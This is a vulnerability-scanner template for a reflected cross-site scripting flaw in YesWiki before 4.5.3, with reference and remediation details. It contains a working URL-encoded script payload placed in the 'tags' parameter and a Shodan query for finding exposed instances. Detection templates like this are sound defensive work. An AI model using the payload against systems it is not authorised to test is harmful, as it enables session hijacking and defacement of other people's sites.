http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - yeswiki-base
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: yeswiki-reflected-xss
info:
  author: MuhammadWaseem
  description: 'YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site
    scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.

    '
  impact: Attackers can steal cookies, hijack user sessions, deface websites, or embed
    malicious content.
  metadata:
    max-request: 1
    shodan-query: yeswiki
    verified: true
  name: YesWiki - Cross-Site Scripting
  reference:
  - https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq
  remediation: 'Upgrade to YesWiki version 4.6.0 or later.

    '
  severity: high
  tags: xss,yeswiki,cms
